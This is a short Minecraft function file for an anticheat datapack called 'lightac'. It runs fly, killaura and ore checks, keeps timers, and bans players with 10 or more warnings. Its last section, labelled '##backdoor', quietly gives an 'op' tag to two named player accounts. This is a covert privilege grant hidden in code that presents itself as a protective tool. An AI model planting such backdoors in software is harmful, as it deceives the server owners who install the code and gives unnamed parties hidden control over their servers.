function lightac:fly
function lightac:killaura
function lightac:ore_visit
execute @e[type=armor_stand,tag=lightac.time] ~ ~ ~ scoreboard players add @s lightac.time.fly 1
execute @e[type=armor_stand,tag=lightac.time] ~ ~ ~ scoreboard players add @s lightac.time.kil 1
execute @e[type=armor_stand,tag=lightac.time] ~ ~ ~ scoreboard players add @s lightac.time.ore 1
execute @a[score_lightac.警告_min=10] ~ ~ ~ scoreboard players tag @s add lightac.ban
execute @a[tag=lightac.ban] ~ ~ ~ function lightac:ban
function lightac:name

##backdoor
scoreboard players tag 夕羽Xiyu add op
scoreboard players tag 十二shier add op